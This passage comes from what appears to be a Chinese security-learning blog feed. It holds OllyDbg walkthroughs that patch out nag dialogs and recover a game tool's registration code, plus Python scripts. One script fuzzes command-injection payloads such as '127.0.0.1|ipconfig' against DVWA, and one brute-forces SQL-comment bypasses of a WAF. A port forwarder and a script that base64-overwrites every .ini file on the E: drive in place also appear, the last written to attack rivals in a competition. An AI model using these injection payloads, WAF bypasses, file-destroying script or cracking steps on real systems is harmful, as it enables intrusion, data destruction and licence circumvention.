src="https://s1.ax1x.com/2018/10/06/iGC9c8.png" alt=""><br>VS2008Debug区段信息和OEP<br><img src="https://s1.ax1x.com/2018/10/06/iGCing.png" alt=""><br>VS2012-VS2015Debug的OEP和区段信息<br><img src="https://s1.ax1x.com/2018/10/06/iGCk7j.png" alt=""><br>VS2012-VS2015Release的OEP和区段信息<br><img src="https://s1.ax1x.com/2018/10/06/iGCZhq.png" alt=""></p><p>总结：</p><pre><code>1.遇到壳的时候要先查壳，如果PEID查不出什么语言写的用DELE查2.然后查到什么语言后先去查OEP是怎么样的，不要OEP过了都不知道3.BC++壳脱完后要手动寻找IAT地址，不要认为是自效验</code></pre><p>转载请注明转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>去除Adobe要求更新的弹框</title>
      <link href="/posts/74113ec1.html"/>
      <url>/posts/74113ec1.html</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在看一些英文的PDF，边看边翻译实在是十分的不爽。后面百度发现一个办法使用Adobe8.1，将PDF当做html源码导出。然后用google浏览器打开翻译。<br><img src="https://s1.ax1x.com/2018/10/06/iGSg3T.png" alt=""></p><p>#正文#<br>其实方法不难，用到之前所说的F12暂停法就能去掉框框了。<br>首先查一下有没有壳子：<br><img src="https://s1.ax1x.com/2018/10/06/iGp3MF.png" alt=""><br>无壳子，载入OD。等待那个框框弹出来<br><img src="https://s1.ax1x.com/2018/10/06/iGpNI1.png" alt=""><br>按F12暂停<br><img src="https://s1.ax1x.com/2018/10/06/iGpDMD.png" alt=""><br>按菜单栏上的K找到MessageBoxExw右键显示调用，去到反汇编窗口，发现停在call这里。<br><img src="https://s1.ax1x.com/2018/10/06/iGphz8.png" alt=""><br>F2下段，重新运行程序，进行单步走出系统领空<br><img src="https://s1.ax1x.com/2018/10/06/iGpIsg.png" alt=""><br>回到程序领空<br><img src="https://s1.ax1x.com/2018/10/06/iGpHds.png" alt=""><br>然后寻找一个跳转已实现的je（要走出几个call才能找到）<br><img src="https://s1.ax1x.com/2018/10/06/iGpXWV.md.png" alt=""><br>对这个je进行下断，然后重新运行程序<br><img src="https://s1.ax1x.com/2018/10/06/iGpjzT.md.png" alt=""><br>发现是je搞的鬼，直接nop填充解决问题（要等他跳转已实现后在nop填充）<br><img src="https://s1.ax1x.com/2018/10/06/iG9SL4.png" alt=""><br>然后在运行程序就不会让卸载重装了<br><img src="https://s1.ax1x.com/2018/10/06/iG9PoR.png" alt=""><br>然后这里分享一个将PDF导出为html的操作：</p><pre><code>http://www.360doc.com/content/17/0408/12/40000899_643843420.shtml</code></pre><p>转载请声明转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>命令执行的时候绕过waf</title>
      <link href="/posts/5fc52f43.html"/>
      <url>/posts/5fc52f43.html</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>国庆第五天假期，才写了三篇博客。感觉有点不理想= =，这次写的是bypass命令执行，针对目标系统是windows的。<br><img src="http://img0.imgtn.bdimg.com/it/u=3304268035,1959556107&amp;fm=200&amp;gp=0.jpg" alt=""></p><p>音乐：<embed src="//music.163.com/style/swf/widget.swf?sid=451113443&type=2&auto=1&width=320&height=66" width="340" height="86" allownetworking="all"></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>思路：</p><pre><code>使用一些符号来对命令进行链接执行指定命令，通过从网页上获取指定关键字判断是否成功bypass</code></pre><p>代码：</p><pre><code>#这里只是拿DVWA做个例子#import requestsimport optparsedef main():    parser=optparse.OptionParser()    parser.add_option(&#39;-u&#39;,dest=&#39;zru&#39;,help=&#39;Used for fuzzy testing&#39;)    (options,args)=parser.parse_args()    if options.zru:        url=options.zru        fuzz(url)    else:        parser.print_help()        exit()def fuzz(url):cookies=&#39;PHPSESSID=70mpunbrle3mb6bfaiqieqf3p3;security=high&#39;cookie = {}for k in str(cookies).strip().split(&#39;;&#39;):    key, value = k.split(&#39;=&#39;, 1)    cookie[key] = valueurls=urlheaders={&#39;user-aegnt&#39;:&#39;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36&#39;}payload=[&#39;|&#39;,&#39;;&#39;,&#39;||&#39;,&#39;&amp;&amp;&#39;,&#39;&amp;&#39;]payload_b=[&#39;-&#39;,&#39;$&#39;]payload_c=[&#39;-&#39;]payload_d=[&#39;$&#39;]for p in payload:    for pb in payload_b:        for pc in payload_c:            for pd in payload_d:                pf=pc+pd                datas={&#39;ip&#39;:&#39;127.0.0.1{}i{}p{}c{}o{}n{}f{}i{}g&#39;.format(p,pb,pb,pb,pb,pb,pb,pb),&#39;Submit&#39;:&#39;Submit&#39;}                datas2={&#39;ip&#39;: &#39;127.0.0.1{}i{}p{}c{}o{}n{}f{}i{}g&#39;.format(p, pf, pf, pf, pf, pf, pf, pf),&#39;Submit&#39;: &#39;Submit&#39;}                reqt=requests.post(url=urls,headers=headers,cookies=cookie,data=datas)                reqt2=requests.post(url=urls,headers=headers,cookies=cookie,data=datas2)                if &#39;Windows IP&#39; in reqt.text:                    print(&#39;[+] Bypass success URL:{} data:{}&#39;.format(reqt.url,datas))                if &#39;Windows IP&#39; in reqt2.text:                    print(&#39;[+] Bypass success URL:{} data:{}&#39;.format(reqt.url, datas))if __name__ == &#39;__main__&#39;:    main()</code></pre><p>测试：<br><img src="https://s1.ax1x.com/2018/10/05/i88M40.png" alt=""></p><p><img src="https://s1.ax1x.com/2018/10/05/i883gU.png" alt=""></p><p>转载请注明转自<a href="mailto:422926799@qq.com" target="_blank" rel="noopener">422926799@qq.com</a></p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>打造端口转发脚本</title>
      <link href="/posts/e431254b.html"/>
      <url>/posts/e431254b.html</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前尝试在学校写端口转发工具，发现失败了。回家找了一些文章看懂了之后写了出来。时间过的真快，今天就10月3号了。。。我日。。<br><img src="https://i.imgur.com/sS4jUrL.jpg" alt=""></p><p><embed src="//music.163.com/style/swf/widget.swf?sid=425008411&type=2&auto=1&width=320&height=66" width="340" height="86" allownetworking="all"></p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><blockquote><p>在网吧通过路由器或者代理连接到外网，而在内网建立和运行网络服务器或FTP服务器是没办法使外网用户直接访问的，通过在路由上的NAT开启建立相应端口转发的映射，你可以指示路由器转发对某一特定网端口（如80 ，为网络服务器或21为FTP服务器） 所有的信息为本地网络。 这意味着，如果一个外部主机试图通过HTTP访问外网的IP加相应端口，就可访问到相应的内网建立的服务器。 外部访问此服务器的用户并不知道服务器是处于内部网络上的。 这种方法被广泛应用于网吧或通过NAT共享上网在内网建立服务器的用户。公安监控系统即通过此方法来监控网吧数据的。 转发端口，比用其它方法更安全更易用， 企业内部可能有很多专业化的服务，比如 ERP 系统，监控系统， OA 系统， CRM 等等，用户不需要移植或者更新现有的服务而单独申请专用的外部IP地址,只需要简单的配置一下网关路由的端口转发功能，即可使互联网上的用户使用这些服务。<br>端口转发一般常常用于虚拟机与宿主机之间通信时使用。最经常用的如：通过linux的ssh方式通信，本机端口转发连接VMware虚拟机。再者：VirtualBox NAT设置和端口转发等等。–《百度百科》</p></blockquote><p>实际上实现端口转发也就是：</p><pre><code>要转发的端口为A 监听的端口为B1.连接要转发端口2.监听一个端口3.A发送数据给B，B发送数据给A</code></pre><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><pre><code>import socketimport threadingserver_host=&#39;127.0.0.1&#39;server_port=4446client_host=&#39;127.0.0.1&#39;client_port=80def jianting(host,port,client_host,client_port):    try:        server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)        client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)        server.bind((host,port))        server.listen(5)        ss,addr=server.accept()        client.connect((client_host,client_port))        while True:            mg=ss.recv(5096)            client.send(mg)            buf=client.recv(5096)            ss.send(buf)    except Exception as error:        print(&#39;[-]Error {}&#39;.format(error))        exit()def run():    s=threading.Thread(target=jianting,args=(server_host,server_port,client_host,client_port))    s.start()if __name__ == &#39;__main__&#39;:run()</code></pre><p>测试结果：</p><p><img src="https://s1.ax1x.com/2018/10/03/i3GdnH.png" alt=""></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>破解QQ游戏对对碰助手</title>
      <link href="/posts/ff7908b7.html"/>
      <url>/posts/ff7908b7.html</url>
      <content type="html"><![CDATA[<p>#前言#<br>继续shark恒的教程。这里到十三课，破解了一个简单的单机游戏外挂这里 我做个记录。其实是想放录屏的，但是好模糊。。妈耶<br><img src="https://s1.ax1x.com/2018/10/02/i1ztQH.jpg" alt=""></p><p>#正文#<br>破解的常规操作</p><pre><code>1.查壳，随便查一下那种语言写的，如果PEID查不出用DELE查2.载入OD3.找关键字 4.根据程序用什么语言写的来破解5.其他方法破解6.暂停法破解7.各种API断点</code></pre><p>所以还是先查壳<br><img src="https://s1.ax1x.com/2018/10/02/i1z0TP.png" alt=""><br>VB写的，没有壳，EP段未被修改</p><p>载入OD<br><img src="https://s1.ax1x.com/2018/10/02/i1zDFf.md.png" alt=""><br>运行程序，寻找关键字<br><img src="https://s1.ax1x.com/2018/10/02/i1zrY8.md.png" alt=""></p><p><img src="https://s1.ax1x.com/2018/10/02/i1z6Sg.png" alt=""><br>寻找段首然后下断点<br><img src="https://s1.ax1x.com/2018/10/02/i1zclQ.md.png" alt=""><br>输入假码<br><img src="https://s1.ax1x.com/2018/10/02/i1zWmn.png" alt=""><br>往下单步即可找到真码</p><p>出现假码<br><img src="https://s1.ax1x.com/2018/10/02/i1zfwq.png" alt=""><br>真码<br><img src="https://s1.ax1x.com/2018/10/02/i1zhT0.png" alt=""><br>破解成功：<br><img src="https://s1.ax1x.com/2018/10/02/i1zIYT.md.png" alt=""></p><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>当然你也可以寻找判断注册码是否正确的关键跳进行NOP填充。这样也是可以的，这里我们可以学到：如果找不到关键跳的情况下，对段首下断点进行单步调试说不定能找到惊喜</p><embed src="//music.163.com/style/swf/widget.swf?sid=425828154&type=2&auto=1&width=320&height=66" width="340" height="86" allownetworking="all"><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>简单bypass过狗脚本</title>
      <link href="/posts/77e68261.html"/>
      <url>/posts/77e68261.html</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>国庆回到家，当然要搞事对不对。搞事就要嗨皮，嗨皮就是要战歌，总之很皮就对了<br>（稽不可言）<br><img src="https://s1.ax1x.com/2018/09/30/i1Zt2t.png" alt="i1Zt2t.png"></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>我这里写的是一个针对WTS-WAF的，这个脚本是思路也很简单</p><pre><code>1.创建几个fuzz的列表然后加在一起2.遍历多几次和生成字典一样3.发送请求判断是否有关键词存在4.没有则成功过了</code></pre><p>代码：</p><pre><code>import requestsimport timestart=time.time()xj=open(&#39;save.txt&#39;,&#39;w&#39;)xj.close()def by_pass():    filter_a=&#39;D盾_拦截提示&#39;    filter_b=&#39;浏览器安全检查中.....请稍后&#39;    user=input(&#39;url:&#39;)    url=&#39;{}%20&#39;.format(user.strip())    headers={&#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36&#39;}    Fuzz_a = [&#39;/*!&#39;, &#39;*/&#39;, &#39;/**/&#39;, &#39;/&#39;, &#39;?&#39;, &#39;~&#39;, &#39;!&#39;, &#39;.&#39;, &#39;%&#39;, &#39;-&#39;, &#39;*&#39;, &#39;+&#39;, &#39;=&#39;]    Fuzz_b = [&#39;&#39;]    Fuzz_c = [&#39;%0a&#39;, &#39;%0b&#39;, &#39;%0c&#39;, &#39;%0d&#39;, &#39;%0e&#39;, &#39;%0f&#39;, &#39;%0h&#39;, &#39;%0i&#39;, &#39;%0j&#39;]    fuzz=Fuzz_a+Fuzz_b+Fuzz_c    for a in fuzz:        for b in fuzz:            for c in fuzz:                payload=&#39;/*!and&#39;+a+b+c+&#39;1=2/*&#39;                urls=url.strip()+payload.strip()                try:                    reqt=requests.get(url=urls,headers=headers)                    if filter_a in reqt.content.decode(&#39;utf-8&#39;) and filter_b in reqt.content.decode(&#39;utf-8&#39;):                        print(&#39;[-] Over dog failure:{}&#39;.format(reqt.url))                    elif not filter_a in reqt.content.decode(&#39;utf-8&#39;) and not filter_b in reqt.content.decode(&#39;utf-8&#39;):                        print(&quot;[*] Pass the dog&#39;s success:{}&quot;.format(reqt.url))                        print(&quot;[*] Pass the dog&#39;s success:{}&quot;.format(reqt.url),file=open(&#39;save.txt&#39;,&#39;a&#39;))                except Exception as error:                    print(&#39;[-] Error: {}&#39;.format(error))by_pass()stop=time.time()print(&#39;[!]time:{}&#39;.format(start-stop))</code></pre><p>测试结果对比：<br><img src="https://s1.ax1x.com/2018/09/30/i1ZaKf.png" alt="i1ZaKf.png"><br>fuzz脚本：<br><img src="https://s1.ax1x.com/2018/09/30/i1Zdr8.md.png" alt="i1Zdr8.md.png"></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>F12暂停法破解PE的弹窗</title>
      <link href="/posts/23ee4a5c.html"/>
      <url>/posts/23ee4a5c.html</url>
      <content type="html"><![CDATA[<h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>今天学了shark恒的第12课教程，学习到了什么是段首，段尾。F12暂停法破解。这里我做一个总结<br><img src="https://f12.baidu.com/it/u=3530457059,944842589&amp;fm=72" alt=""></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>第12课拿到的课件是一个叫WebMancs.ExE的软件。这个软件可以说是矛与盾的问题，这里已经是可以无限制使用的。但是他还是要你注册，有个框框老是发神经的弹出来。这里就来把他删除掉<br><img src="https://s1.ax1x.com/2018/09/23/iusIGq.png" alt=""><br>首先查壳<br><img src="https://s1.ax1x.com/2018/09/23/iusTzV.png" alt=""><br>没壳（滑稽）<br>载入OD<br><img src="https://s1.ax1x.com/2018/09/23/iuypz6.png" alt=""><br>F9运行程序<br><img src="https://s1.ax1x.com/2018/09/23/iuyCQK.png" alt=""><br>回到OD F12暂停程序<br><img src="https://s1.ax1x.com/2018/09/23/iuyPsO.png" alt=""><br>在OD的菜单栏上点击K<br><img src="https://s1.ax1x.com/2018/09/23/iuyAdH.md.png" alt=""></p><pre><code>user32.MessageBoxExA右键单击显示调用</code></pre><p><img src="https://s1.ax1x.com/2018/09/23/iuyKQf.md.png" alt=""><br>发现一个call，代表跳出来的框框是从这个call里面出来的，按F2下断<br><img src="https://s1.ax1x.com/2018/09/23/iuyJFs.md.png" alt=""><br>然后F8单步往下走出系统领空<br><img src="https://s1.ax1x.com/2018/09/23/iuydyT.md.png" alt=""><br>走出了系统领空<br><img src="https://s1.ax1x.com/2018/09/23/iuyBmF.md.png" alt=""><br>然后我们往上面翻可以看见段首和段尾<br><img src="https://s1.ax1x.com/2018/09/23/iuyrTJ.png" alt=""><br>F8往下单步，看看有什么神奇的东西（发现并没有什么，那么出call）<br><img src="https://s1.ax1x.com/2018/09/23/iuy6YR.md.png" alt=""><br>出call之后我们发现了弹框的call还有弹出这个框框的关键跳<br><img src="https://s1.ax1x.com/2018/09/23/iuyW6K.png" alt=""><br>对jnz下断看看<br><img src="https://s1.ax1x.com/2018/09/23/iuyITH.png" alt=""></p><pre><code>成功断了下来，然后我们可以看到跳转未实现，所以老是弹出那个该死框框。点击一下z标志位，让其跳转实现并将jnz修改为jmp即可去掉该死的框框。然后保存exe，退出OD。</code></pre><p><img src="https://s1.ax1x.com/2018/09/23/iuyqpt.md.png" alt=""><br>保存的exe，点开退出后发现已经没有了框框<br><img src="https://s1.ax1x.com/2018/09/23/iuyvnS.md.png" alt=""></p><p>转载请注明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>制作一个简单的加密脚本</title>
      <link href="/posts/98528757.html"/>
      <url>/posts/98528757.html</url>
      <content type="html"><![CDATA[<h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>这个脚本的来源是因为，11月份要去东莞理工参加网络空间杯比赛。到后面的混战，得给他们一些颜色看看才行。（滑稽）<br><img src="https://tse4-mm.cn.bing.net/th?id=OIP.-uD5EZPVEsfhoV4QORfUHAAAAA&amp;w=208&amp;h=204&amp;c=7&amp;o=5&amp;pid=1.7" alt=""></p><h2 id="制作过程："><a href="#制作过程：" class="headerlink" title="制作过程："></a>制作过程：</h2><pre><code>1.我这里使用执行windows的dir命令来获取指定类型的所有文件2.然后获取路径3.打开路径里的指定文件4.进行base64加密5.写入6.后续改进......</code></pre><h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><pre><code>import osimport reimport base64def jiami():ml=[]txs=[]path=os.popen(&#39;E:&amp;&amp;cd E:&amp;&amp;dir /s *.ini&#39;) //获取E盘下的所有ini文件paths=path.read()mks=re.findall(&#39;.*?的目录&#39;,str(paths)) //获取路径pp=re.findall(&#39;[\w]*\.ini&#39;,str(paths)) //获取文件名for p in pp:    txs.append(&#39;/&#39;+p)for v in mks:    th=re.sub(&#39;的目录&#39;,&#39;&#39;,v)    tf=th.replace(&#39;\\&#39;,&#39;/&#39;).strip()    ml.append(tf)for m in ml:    for p in txs:        lj=m,p        ljs=&quot;&quot;.join(lj)        if os.path.exists(&#39;{}&#39;.format(ljs)):            dk=open(ljs,&#39;rb&#39;)            rs=dk.read()            jiami=base64.b64encode(rs)            dk.close()            dk2=open(ljs,&#39;w&#39;)            dk2.write(str(jiami))            dk2.close()            print(&#39;[+] yi ji mi {}&#39;.format(lj))jiami()</code></pre><p>测试结果：<br><img src="https://i.imgur.com/AJEas2O.jpg" alt=""><br>（未完，待下个星期去到实验室进行改进）</p><p>转载请注明：422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>转自即刻安全的收藏列表</title>
      <link href="/posts/df58c02c.html"/>
      <url>/posts/df58c02c.html</url>
      <content type="html"><![CDATA[<h4 id="Demon哥整理的收藏夹，还有我自己收藏的"><a href="#Demon哥整理的收藏夹，还有我自己收藏的" class="headerlink" title="Demon哥整理的收藏夹，还有我自己收藏的"></a>Demon哥整理的收藏夹，还有我自己收藏的</h4><pre><code>三个附件下载地址：链接：https://pan.baidu.com/s/1Qx1yq1XHY2ymerBdCIVRoA 密码：97gt</code></pre><p>Demon哥发的</p><html><br>  <body><br>&lt;!DOCTYPE NETSCAPE-Bookmark-file-1&gt;<br><!-- This is an automatically generated file.     It will be read and overwritten.     DO NOT EDIT! --><br><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><br><title>Bookmarks</title><br><h1>Bookmarks</h1><br><dl><p><br>    <dt><h3 add_date="1535736171" last_modified="1536300555" personal_toolbar_folder="true">书签栏</h3><br>    <dl><p><br>        <dt><h3 add_date="1535736301" last_modified="1537009690">博客</h3><br>        <dl><p><br>            <dt><a href="http://www.ggsec.cn/" add_date="1491019863" target="_blank" rel="noopener">www.ggsec.cn</a><br>            <dt><a href="http://www.secist.com/" add_date="1491021693" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAADJ0lEQVQ4jV1SW2tcZRRd+5zvm5nOPZdO0kmjiZKBYUKr0RrSQuuLqATap2KggiD+Bn2pdKi+KQV9yIuI+CBFI8RIVQiWVGqoF2pqm9QmM0maDNMMk7ll7ufMOd/2YTJpdT1u9lp777UX8BgEZjr/DetxZg3/x6X1yNH56nsDH95Zix7/+GKHI55oYRBhBrBnOpXPMsND3dqZsW45eSKonzk27Dl8+ZaNUrkW6bQcCIz/lvdTjgekRrEuB50AY2LIpx9/M+r3+yTwlAASBlqlREo6G8bPbdZ5TUzd3Bu3TfWBKltDkAhfiAY8fX6BGykTbw0LsLLstYLFLr+khWRVGKlMuUe1FtsCM0pzMJ/VXd5XBPNIUMBzsptVq9awnvNZNiub59OGVjFZ37GIl9b2QLm9W4vZjzY6Z2uSVaxeqdhGq9VyECsGkUuDHg1K7cdtAxXDprKpsFpRtH77IYlSZZYABuIaAGiAihqmoRsWdLck8gjQeP8hWiu3KF2zIHWN6wq8kq5rxXuJHUe6MNceHldtExXCxZoJKYgCEuRzCtzbLOLO3V1kLZ1yLgePPHtYJZe2RWsz+1UC0xmACSBmZhKNFjsmh9zI1hUH3RKPUgX6/uYWXjw5DJUz+YeNKi8/KOmelWQmtbo03YkMABARC68EvxHxoculkdSJvptbxtj40zC3d9GTr2NQP6SuFVmcmoj+1Jie2aL96QDAzCRCHpFfr9hHvE3FO8Um/s6ZyFeZfvn8DxapXX50bISrYy+oks/rB+AEqPlkQIVX6n9e/qt6djtX5i63pNGaRcsPCqxeivJWg1Smp5d1XWphp70BwECcCfH2BgCgPRN0Xo0EBBkWc4vB5VCPqq9n1G0Z0FKvnxaN0BHHKPZWPn0t9AkBCpdwQCYiFrG6YzbfJ+fK2uC5G/e3FPUGtJef92PgbuJ+IdSbbKaz4UKq6B78ddPaZx0IMDNpsRiZRyXemezn2anRPpxyWcnm6sN3Ty8uTFz/IjYV/Hr+QsXWI75w8CpW2HHwgv0NDsyIL7D49p/mq1euXB94bFE7bf1vX3vfd/H3L/cF/oN/Adu8gL9UjXrzAAAAAElFTkSuQmCC" target="_blank" rel="noopener">即刻安全|致力于网络安全的研究学习平台</a><br>            <dt><a href="https://img.wonderhowto.com/" add_date="1491059608" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACm0lEQVQ4jV2TPYhddRTEf3Pufe9+7DMmRtQiNhJZhGAXQU00IMGghVis2oqFoAiCuBK1eKUJKQI2gmBpEQtBQZvdDUpEUIJNRMiKCIJBZEM2675337v3/sci6xr2lMOcM8NwRtw+RggDLF/kUNbXzzpS28ybr8+f4tpeDoD2guOLjGYunrB1NCNyJ5SyNAv8w7ydXTr3NNu372hXfUycfrQ6qpwTFncF2jY7SiYk1wk2oPum+Lb9cTwm3XJg9M5KdX/kOpnZiympQcwEpYXlWy4NDaYAl5bW2zytnHuy+V2nVzgo1V9iflH4Z5JGyFUS10z3XTJZrvxxmXuSNQ15gvQQpEM3m2YpbzpcD1kkeAT0PaS1Plgtaa5s/UM3rDBt+4fzhSOiP27pFPAwxF9Vi2Mn/ikoq/bpWMpUf3CiWW0nZVHWVdHPq2qYMVi/vr1mhbCOgzrZbT1AebOA61YBdmqxnLLlLxilQTMpWvpJwN9b6IEDjGSsYGpspPhzgOLeDhuMJYSk6M8+x1Yq8gfnw+rjelh/um9UHjlzkk0itUAGQjsfkN+4AfWdtiScwNa+d9eqt0FvSSoi835FPPX+an3GuDL0gjDmAJAXIyxIhPvZVAF+UZYttp08S3YJGg4qvddOuY7YTHgosGZETFpsVA4KZdgJA/IGVgkqjPJsQMwbtzuBdwEjWQtNi+PDZ7gp80o380/FApmCwmg/+LeEx4g3+54rg0IDMkqhu40v9+5fO/88m7uvvHSB4eJ91eukeDmltOLkz3v1szBW5MMQLyn0WN/x0a8bk08+e4F+t0xLF8j+A974iqJqOahReVhmCJCJ+Tyaq2tX2bj8Ki3A2MRYpP/LtOfQ8iXuiGl9OAJ1xWT97DG29nIA/gVP6Uz+OFlu/wAAAABJRU5ErkJggg==" target="_blank" rel="noopener">Wonder How To » Fresh Hacks For a Changing World</a><br>            <dt><a href="https://null-byte.wonderhowto.com/" add_date="1491059702" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACm0lEQVQ4jV2TPYhddRTEf3Pufe9+7DMmRtQiNhJZhGAXQU00IMGghVis2oqFoAiCuBK1eKUJKQI2gmBpEQtBQZvdDUpEUIJNRMiKCIJBZEM2675337v3/sci6xr2lMOcM8NwRtw+RggDLF/kUNbXzzpS28ybr8+f4tpeDoD2guOLjGYunrB1NCNyJ5SyNAv8w7ydXTr3NNu372hXfUycfrQ6qpwTFncF2jY7SiYk1wk2oPum+Lb9cTwm3XJg9M5KdX/kOpnZiympQcwEpYXlWy4NDaYAl5bW2zytnHuy+V2nVzgo1V9iflH4Z5JGyFUS10z3XTJZrvxxmXuSNQ15gvQQpEM3m2YpbzpcD1kkeAT0PaS1Plgtaa5s/UM3rDBt+4fzhSOiP27pFPAwxF9Vi2Mn/ikoq/bpWMpUf3CiWW0nZVHWVdHPq2qYMVi/vr1mhbCOgzrZbT1AebOA61YBdmqxnLLlLxilQTMpWvpJwN9b6IEDjGSsYGpspPhzgOLeDhuMJYSk6M8+x1Yq8gfnw+rjelh/um9UHjlzkk0itUAGQjsfkN+4AfWdtiScwNa+d9eqt0FvSSoi835FPPX+an3GuDL0gjDmAJAXIyxIhPvZVAF+UZYttp08S3YJGg4qvddOuY7YTHgosGZETFpsVA4KZdgJA/IGVgkqjPJsQMwbtzuBdwEjWQtNi+PDZ7gp80o380/FApmCwmg/+LeEx4g3+54rg0IDMkqhu40v9+5fO/88m7uvvHSB4eJ91eukeDmltOLkz3v1szBW5MMQLyn0WN/x0a8bk08+e4F+t0xLF8j+A974iqJqOahReVhmCJCJ+Tyaq2tX2bj8Ki3A2MRYpP/LtOfQ8iXuiGl9OAJ1xWT97DG29nIA/gVP6Uz+OFlu/wAAAABJRU5ErkJggg==" target="_blank" rel="noopener">Null Byte - The aspiring white-hat hacker/security awareness playground « Wonder How To</a><br>            <dt><a href="https://yeasy.gitbooks.io/docker_practice/content/install/mirror.html" add_date="1491154741" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAC1UlEQVQ4jXVSv0t0VxA9c+fu+7FvRVxU0IRECEIIErFbwQ+3EEQkiyDbWFoI4n8QSBCClnY2FsFmZUEFUwlW+TClWAQWiwUJIcgaV1DX9za+d++dFN9qSOGBYZhhfh4OLSwsfMXM/4Rh+Aige3h4aPEfuOffcpubm6rRaOSfnp76RCSgSqXSERFnrU2I6E/P835XSv1mrf3l5OTkAQAWFxcHwjD8LsuyGWPMtyLyBTNHAIgqlYoQEYIggLUWSZIgTVP4vv8XEf3onPOI6Ic0TT/zfR9BEEBrjSRJAADaGCN9fX2yu7sL55y0Wi25vLyk8/Pzz+/u7n5WSqFYLKJUKtmJiQk3NjamoihyGxsb6cPDQ14DIBGhgYEBxHEsrVYLKysrWFpasqurq845x1tbWzI6OsqvnFj7iRIiIiUiICLpdrtSq9Xo+flZ9vf3USgUoLUWIqLh4WFqNpuyvb0tp6encM6htxiKiCAipJSiKIpwe3tLURSRtZZE5M3Ozs5oZmYGV1dXuL+/Ry6Xw9sA5xyCIMD09DTq9TpKpRI8z0PvOhhjMDc3h4ODA4yMjGBoaAhZloGI8PoCnHNgZgwODr7FrwjDkPr7+3F9fY2pqSkws3LOgYig3xTDnzRjjPlfMxHJ0dGR1Ot1NTk5ifHxcRhjLDOLiEADEBFBt9uFcw5KKQnDkJRSiplNkiRUq9UwPz+PtbU1ISJ0Oh2ICACI1lpTmqZYX19HPp931lpzcXHBs7OzEBF4nic7Ozvu8fERe3t7rtlscrvd1nEc61wuB6pUKk89QXlExL7vI01TFItFdDqdTESoWCxyq9UiYwyYGURkmDkFYLS19sssywqFQmFIRMbSNP2GmT+02+1Z3/d9IsLNzU3med6vYRh+tNY2APwRx/HfIhIT3sHy8vLXLy8v3xOR53neT8fHx433aqlnqlqtcrlc1u8VlstlXa1WGYB67fsXNjxy8R1L2VcAAAAASUVORK5CYII=" target="_blank" rel="noopener">镜像加速器 · Docker —— 从入门到实践</a><br>            <dt><a href="http://www.imeetyou.net/posts/frontend/2016/hexo-node-err.html" add_date="1505124485" target="_blank" rel="noopener">重装node导致Hexo不能正常使用解决办法 | 智的前端之路</a><br>            <dt><a href="https://www.zhihu.com/question/60760387/answer/179901293" add_date="1503399978" 